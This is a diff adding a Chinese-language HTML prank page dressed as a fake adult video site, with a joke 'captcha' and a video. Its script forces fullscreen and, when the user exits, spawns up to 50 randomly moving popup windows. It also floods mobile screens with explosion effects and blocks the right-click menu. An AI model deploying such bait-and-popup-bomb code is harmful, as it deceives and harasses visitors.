@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>pron bhu - 破人湖北</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Microsoft YaHei', sans-serif;
+        }
+        
+        :root {
+            --primary-yellow: #ffcc00;
+            --primary-black: #121212;
+            --accent-yellow: #ffd700;
+            --accent-black: #333;
+        }
+        
+        body {
+            background-color: var(--primary-black);
+            color: var(--primary-yellow);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        /* 顶部导航栏样式 */
+        .navbar {
+            background-color: var(--accent-black);
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 3px solid var(--primary-yellow);
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background-color: var(--primary-yellow);
+            border-radius: 50%;
+            margin-right: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            color: var(--accent-black);
+        }
+        
+        .logo-text {
+            font-size: 1.8rem;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+        
+        /* 主内容区域样式 */
+        .container {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 0 20px;
+        }
+        
+        .section-title {
+            text-align: center;
+            font-size: 2.5rem;
+            margin: 30px 0;
+            text-shadow: 0 0 5px rgba(255, 204, 0, 0.5);
+            position: relative;
+        }
+        
+        .section-title:after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 3px;
+            background-color: var(--primary-yellow);
+        }
+        
+        .info-box {
+            background-color: rgba(255, 204, 0, 0.1);
+            border: 1px solid var(--primary-yellow);
+            border-radius: 5px;
+            padding: 20px;
+            margin: 30px 0;
+            text-align: center;
+        }
+        
+        .info-text {
+            font-size: 1.2rem;
+            line-height: 1.6;
+        }
+        
+        .warning {
+            color: #ff3333;
+            font-weight: bold;
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        /* 人机验证区域 */
+        .captcha-container {
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 30px;
+            background-color: rgba(51, 51, 51, 0.8);
+            border: 2px solid var(--accent-yellow);
+            border-radius: 8px;
+        }
+        
+        .captcha-title {
+            text-align: center;
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+        }
+        
+        .captcha-text {
+            font-size: 1.1rem;
+            margin-bottom: 25px;
+            text-align: center;
+            line-height: 1.6;
+        }
+        
+        .captcha-input {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+        
+        input[type="text"] {
+            padding: 10px 15px;
+            width: 70%;
+            font-size: 1.1rem;
+            background-color: rgba(0, 0, 0, 0.5);
+            color: var(--primary-yellow);
+            border: 1px solid var(--primary-yellow);
+            border-radius: 4px 0 0 4px;
+            outline: none;
+        }
+        
+        input[type="text"]:focus {
+            border-color: var(--accent-yellow);
+            box-shadow: 0 0 5px var(--accent-yellow);
+        }
+        
+        .captcha-button {
+            padding: 10px 25px;
+            font-size: 1.1rem;
+            background-color: var(--primary-yellow);
+            color: var(--accent-black);
+            border: none;
+            border-radius: 0 4px 4px 0;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+        
+        .captcha-button:hover {
+            background-color: var(--accent-yellow);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 10px rgba(255, 204, 0, 0.3);
+        }
+        
+        /* 视频播放区域 */
+        .video-container {
+            display: none;
+            margin: 50px auto;
+            max-width: 800px;
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        
+        .video-title {
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+        }
+        
+        video {
+            max-width: 100%;
+            border: 3px solid var(--primary-yellow);
+            border-radius: 5px;
+        }
+        
+        .warning-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            color: red;
+            text-align: center;
+            padding-top: 20%;
+            font-size: 4rem;
+            z-index: 9999;
+        }
+        
+        .explosion {
+            position: fixed;
+            width: 100px;
+            height: 100px;
+            background: radial-gradient(circle, #ff3300 0%, #ff0000 50%, transparent 70%);
+            border-radius: 50%;
+            opacity: 0;
+            z-index: 10000;
+            pointer-events: none;
+            animation: explode 0.8s forwards;
+        }
+        
+        @keyframes explode {
+            0% { transform: scale(0); opacity: 0.8; }
+            100% { transform: scale(3); opacity: 0; }
+        }
+        
+        .footnote {
+            text-align: center;
+            font-size: 0.9rem;
+            color: rgba(255, 204, 0, 0.7);
+            margin-top: 30px;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+    <!-- 导航栏 -->
+    <div class="navbar">
+        <div class="logo">
+            <div class="logo-icon">PB</div>
+            <div class="logo-text">PRON BHU | 破人湖北</div>
+        </div>
+        <div class="nav-links">
+            <button class="captcha-button" style="background-color: transparent; border: 1px solid var(--primary-yellow);">登录</button>
+        </div>
+    </div>
+    
+    <!-- 主内容区域 -->
+    <div class="container">
+        <div class="section-title">PRON BHU 破人湖北</div>
+        
+        <div class="info-box">
+            <p class="info-text">
+                <span class="warning">❤️❤️❤️</span>❤️❤️❤️
+            </p>
+            <p class="info-text" style="margin-top: 20px;">
+                ♥♥♥
+            </p>
+        </div>
+        
+        <!-- 人机验证区域 -->
+        <div class="captcha-container">
+            <div class="captcha-title">让我们战胜机器人！</div>
+            <p class="captcha-text">
+                为了确保您是真实的人类用户，请解决以下问题：<br>
+                <strong>"1+1+4+5+1+4-5-1-1-4+1"</strong>
+            </p>
+            <p class="captcha-text">
+                请输入您的答案：
+            </p>
+            <div class="captcha-input">
+                <input type="text" id="captcha-answer" placeholder="请输入数字答案...">
+                <button class="captcha-button" onclick="checkCaptcha()">提交</button>
+            </div>
+            <p id="captcha-result" class="captcha-text" style="color: #ff3333; display: none;"></p>
+        </div>
+        
+        <!-- 视频播放区域 -->
+        <div class="video-container" id="video-container">
+            <div class="video-title">精彩♥♥内容</div>
+            <video id="main-video" controls>
+                <source src="lol.mp4" type="video/mp4">
+                您的浏览器不支持视频标签。
+            </video>
+            <p class="info-text" style="margin-top: 20px;">
+                警告：请勿退出全屏，否则可能会触发安全防护机制
+            </p>
+        </div>
+    </div>
+    
+    <!-- 退出全屏警告 -->
+    <div class="warning-container" id="warningContainer">
+        警告！请不要退出全屏！
+    </div>
+    
+    <div class="footnote">
+        本网站为模拟演示，无任何实际内容 | PRON BHU © 2025 | 不健康上网 坚持赤石
+    </div>
+    
+    <script>
+        // 检测设备类型
+        let deviceType = 'desktop';
+        const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        const isTabletDevice = /(ipad|tablet|(android(?!.*mobile))|(windows(?!.*phone)(.*touch))|kindle|playbook|silk|(puffin(?!.*(IP|AP|WP))))/i.test(navigator.userAgent);
+        
+        // 确定设备类型
+        if (isMobileDevice || isTabletDevice) {
+            deviceType = 'mobile';
+        } else if (navigator.userAgent.includes('Windows') || 
+                   navigator.userAgent.includes('Macintosh') || 
+                   navigator.userAgent.includes('Linux')) {
+            deviceType = 'desktop';
+        }
+        
+        // 存储检测结果
+        console.log(`检测到的设备类型为：${deviceType}`);
+        
+        // 人机验证逻辑
+        function checkCaptcha() {
+            const answer = document.getElementById('captcha-answer').value;
+            const resultElement = document.getElementById('captcha-result');
+            
+            if (answer === '6') {
+                resultElement.textContent = '验证通过！请开始享受内容...';
+                resultElement.style.color = '#33cc33';
+                resultElement.style.display = 'block';
+                
+                // 1.5秒后显示视频
+                setTimeout(() => {
+                    document.querySelector('.captcha-container').style.display = 'none';
+                    document.getElementById('video-container').style.display = 'block';
+                    
+                    // 启动视频播放
+                    const video = document.getElementById('main-video');
+                    video.play();
+                    
+                    // 如果是桌面设备，进入全屏模式
+                    if (deviceType === 'desktop') {
+                        requestFullscreen();
+                        document.addEventListener('fullscreenchange', exitFullScreenHandler);
+                        document.addEventListener('mozfullscreenchange', exitFullScreenHandler);
+                        document.addEventListener('webkitfullscreenchange', exitFullScreenHandler);
+                        document.addEventListener('msfullscreenchange', exitFullScreenHandler);
+                    }
+                }, 1500);
+            } else {
+                resultElement.textContent = '答案错误！请再试一次！（提示：乐子 多简单的问题 还不会）';
+                resultElement.style.display = 'block';
+                
+                // 清空输入框
+                document.getElementById('captcha-answer').value = '';
+            }
+        }
+        
+        // 请求全屏
+        function requestFullscreen() {
+            const element = document.documentElement;
+            if (element.requestFullscreen) {
+                element.requestFullscreen();
+            } else if (element.mozRequestFullScreen) {
+                element.mozRequestFullScreen();
+            } else if (element.webkitRequestFullscreen) {
+                element.webkitRequestFullscreen();
+            } else if (element.msRequestFullscreen) {
+                element.msRequestFullscreen();
+            }
+        }
+        
+        // 退出全屏处理函数
+        function exitFullScreenHandler() {
+            if (!document.fullscreenElement && 
+                !document.webkitFullscreenElement && 
+                !document.mozFullScreenElement && 
+                !document.msFullscreenElement) {
+                
+                // 当用户退出全屏时
+                const warningContainer = document.getElementById('warningContainer');
+                warningContainer.style.display = 'block';
+                
+                // 创建新窗口
+                createWindows();
+            } else {
+                // 当进入全屏时，隐藏警告
+                document.getElementById('warningContainer').style.display = 'none';
+            }
+        }
+        
+        // 创建弹出窗口
+        function createWindows() {
+            const urls = [
+                'https://example.com',
+                'https://example.com',
+                'https://example.com'
+            ];
+            
+            let count = 0;
+            const interval = setInterval(() => {
+                if (count >= 50) {
+                    clearInterval(interval);
+                    return;
+                }
+                
+                try {
+                    // 创建新窗口
+                    const width = Math.floor(Math.random() * 500) + 200;
+                    const height = Math.floor(Math.random() * 500) + 200;
+                    const left = Math.floor(Math.random() * (screen.width - width));
+                    const top = Math.floor(Math.random() * (screen.height - height));
+                    
+                    const win = window.open(
+                        urls[Math.floor(Math.random() * urls.length)], 
+                        '_blank', 
+                        `width=${width},height=${height},left=${left},top=${top}`
+                    );
+                    
+                    // 移动窗口（如果可能）
+                    setTimeout(() => {
+                        try {
+                            if (win && !win.closed) {
+                                moveWindow(win);
+                            }
+                        } catch (e) {
+                            // 处理可能的权限错误
+                        }
+                    }, 1000);
+                } catch (e) {
+                    // 处理可能的阻止弹窗错误
+                }
+                
+                count++;
+            }, 500);
+        }
+        
+        // 移动窗口
+        function moveWindow(win) {
+            let x = Math.floor(Math.random() * (screen.width - win.innerWidth));
+            let y = Math.floor(Math.random() * (screen.height - win.innerHeight));
+            
+            try {
+                win.moveTo(x, y);
+                
+                // 持续移动窗口
+                const moveInterval = setInterval(() => {
+                    if (win.closed) {
+                        clearInterval(moveInterval);
+                        return;
+                    }
+                    
+                    x = Math.floor(Math.random() * (screen.width - win.innerWidth));
+                    y = Math.floor(Math.random() * (screen.height - win.innerHeight));
+                    
+                    try {
+                        win.moveTo(x, y);
+                    } catch (e) {
+                        clearInterval(moveInterval);
+                    }
+                }, 1000);
+            } catch (e) {
+                // 处理移动窗口错误
+            }
+        }
+        
+        // 创建爆炸特效
+        function createExplosion() {
+            const explosion = document.createElement('div');
+            explosion.className = 'explosion';
+            
+            // 随机位置
+            const x = Math.random() * window.innerWidth;
+            const y = Math.random() * window.innerHeight;
+            
+            explosion.style.left = `${x}px`;
+            explosion.style.top = `${y}px`;
+            
+            document.body.appendChild(explosion);
+            
+            // 移除元素
+            setTimeout(() => {
+                explosion.remove();
+            }, 800);
+        }
+        
+        // 手机端触发特效
+        if (deviceType === 'mobile') {
+            // 当用户尝试播放视频时触发爆炸特效
+            document.getElementById('main-video').addEventListener('play', () => {
+                // 开始连续创建爆炸
+                setInterval(createExplosion, 300);
+            });
+        }
+        
+        // 防止右键菜单
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+    </script>
+</body>
+</html>
